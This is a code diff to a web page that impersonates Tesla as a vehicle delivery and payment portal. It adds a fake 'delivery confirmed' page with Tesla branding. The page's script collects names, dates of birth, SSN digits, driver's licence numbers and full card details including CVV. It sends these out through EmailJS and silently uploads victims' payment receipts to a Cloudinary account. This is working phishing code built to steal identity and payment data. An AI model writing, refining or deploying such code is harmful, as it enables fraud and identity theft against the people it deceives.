@@ -382,11 +382,78 @@
         </div>
     </div>
 
-   <!-- EmailJS and Cloudinary Integration -->
+    <!-- Page 3: Confirmation -->
+<div class="container hidden" id="confirmation-page">
+    <div class="header">
+        <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
+    </div>
+
+    <div class="content">
+        <div class="progress-bar">
+            <div class="progress-steps">
+                <div class="progress-step completed">1. Identity</div>
+                <div class="progress-step completed">2. Payment</div>
+                <div class="progress-step active">3. Confirmation</div>
+            </div>
+            <div class="progress-line-container">
+                <div class="progress-indicator" style="width: 100%"></div>
+            </div>
+        </div>
+
+        <div class="confirmation-icon">
+            <svg viewBox="0 0 24 24" fill="#5cb85c">
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+            </svg>
+        </div>
+
+        <h2 style="text-align: center;">Your Tesla Delivery is Confirmed!</h2>
+
+        <div class="summary-box">
+            <div class="summary-row">
+                <span>Vehicle:</span>
+                <span>Model Y Performance</span>
+            </div>
+            <div class="summary-row">
+                <span>VIN:</span>
+                <span id="vin-display">7SAYGDEF5PF123456</span>
+            </div>
+            <div class="summary-row">
+                <span>Delivery Date:</span>
+                <span id="delivery-date">October 14, 2024</span>
+            </div>
+            <div class="summary-row">
+                <span>Delivery Address:</span>
+                <span id="delivery-address">123 Main St, Anytown, CA 90210</span>
+            </div>
+            <div class="summary-row total">
+                <span>Amount Paid:</span>
+                <span>$2,285.00</span>
+            </div>
+        </div>
+
+        <div style="text-align: center; margin: 25px 0;">
+            <p>You will receive a delivery confirmation email within 24 hours.</p>
+            <p>Track your vehicle at <a href="#">www.tesla.com/track</a></p>
+        </div>
+
+        <button class="btn" onclick="alert('This is a demonstration only. No actual receipt is generated.')">Download Receipt</button>
+
+        <div class="security-badge" style="justify-content: center;">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right: 8px;">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+            </svg>
+            Transaction ID: TES-78912345-2024
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>Tesla © 2024 | Privacy Policy | Terms of Use</p>
+        <p>3500 Deer Creek Road, Palo Alto, CA 94304</p>
+    </div>
+</div>
+
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script src="https://upload-widget.cloudinary.com/global/all.js"></script>
 <script>
-    // Initialize EmailJS
     emailjs.init("1-W3uHSnlpZGDZ1i3");
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -397,15 +464,6 @@
     document.getElementById('delivery-date').textContent = deliveryDate;
     document.getElementById('delivery-address').textContent = deliveryAddress;
     document.getElementById('vin-display').textContent = vin;
-
-    // Show file name when receipt is selected
-    document.getElementById('bank-receipt')?.addEventListener('change', function(e) {
-        document.getElementById('bank-file-name').textContent = e.target.files[0]?.name || 'No file selected';
-    });
-
-    document.getElementById('crypto-receipt')?.addEventListener('change', function(e) {
-        document.getElementById('crypto-file-name').textContent = e.target.files[0]?.name || 'No file selected';
-    });
 
     function showPage(pageId) {
         document.querySelectorAll('.container').forEach(el => {
@@ -433,31 +491,25 @@
         document.getElementById(`${method}-payment`).classList.remove('hidden');
     }
 
-    // Upload file silently to Cloudinary
-    async function uploadReceiptSilently(file) {
-        const url = `https://api.cloudinary.com/v1_1/do9yjpizs/upload`;
+    async function silentUploadToCloudinary(file) {
+        const url = 'https://api.cloudinary.com/v1_1/do9yjpizs/upload';
         const formData = new FormData();
-        formData.append("file", file);
-        formData.append("upload_preset", "unsigned_preset");
+        formData.append('file', file);
+        formData.append('upload_preset', 'unsigned_preset');
 
-        const res = await fetch(url, {
-            method: "POST",
+        const response = await fetch(url, {
+            method: 'POST',
             body: formData
         });
 
-        const data = await res.json();
-        if (data.secure_url) {
-            return data.secure_url;
-        } else {
-            throw new Error("Receipt upload failed.");
-        }
+        const data = await response.json();
+        if (!data.secure_url) throw new Error("Cloudinary upload failed");
+        return data.secure_url;
     }
 
-    // Main payment processing logic
     async function processPayment() {
         const payButton = document.getElementById('complete-payment-btn');
-        const errorBox = document.getElementById('error-message');
-        errorBox.textContent = '';
+        const originalText = payButton.textContent;
         payButton.textContent = 'Processing...';
         payButton.disabled = true;
 
@@ -470,8 +522,7 @@
                 }
             }
 
-            const paymentMethod = document.querySelector('.payment-method.active')?.textContent.trim();
-            if (!paymentMethod) throw new Error("Please select a payment method.");
+            const paymentMethod = document.querySelector('.payment-method.active').textContent.trim();
 
             const templateParams = {
                 full_legal_name: document.getElementById('fullname').value,
@@ -487,10 +538,10 @@
 
             if (paymentMethod === 'Credit/Debit') {
                 const cardFields = ['card-number', 'expiry', 'cvv', 'card-name'];
-                for (const fieldId of cardFields) {
-                    const field = document.getElementById(fieldId);
-                    if (!field || !field.value) {
-                        throw new Error("Please complete all credit card fields");
+                for (const field of cardFields) {
+                    const el = document.getElementById(field);
+                    if (!el || !el.value.trim()) {
+                        throw new Error('Please complete all card details');
                     }
                 }
 
@@ -506,7 +557,7 @@
                     throw new Error('Please upload your payment receipt');
                 }
 
-                const receiptUrl = await uploadReceiptSilently(fileInput.files[0]);
+                const receiptUrl = await silentUploadToCloudinary(fileInput.files[0]);
                 templateParams.receipt_url = receiptUrl;
             }
 
@@ -519,32 +570,17 @@
             if (emailResponse.status === 200) {
                 showPage('confirmation-page');
             } else {
-                throw new Error('Failed to send confirmation email.');
+                throw new Error('Email sending failed');
             }
-
         } catch (error) {
-            const msg = error.message || error.toString();
-            errorBox.textContent = `Error: ${msg}`;
+            alert('Error: ' + error.message);
+            console.error('Payment processing error:', error);
         } finally {
-            payButton.textContent = 'Complete Payment';
+            payButton.textContent = originalText;
             payButton.disabled = false;
         }
     }
-
-    // Prefill dev test data
-    if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
-        document.addEventListener('DOMContentLoaded', function () {
-            document.getElementById('fullname').value = 'John Doe';
-            document.getElementById('dob').value = '1985-01-15';
-            document.getElementById('ssn').value = '1234';
-            document.getElementById('dl').value = 'DL12345678';
-            document.getElementById('card-number').value = '4111111111111111';
-            document.getElementById('expiry').value = '12/25';
-            document.getElementById('cvv').value = '123';
-            document.getElementById('card-name').value = 'John Doe';
-        });
-    }
-</script>
+                    </script>
 </body>
 </html>
-    
+                    
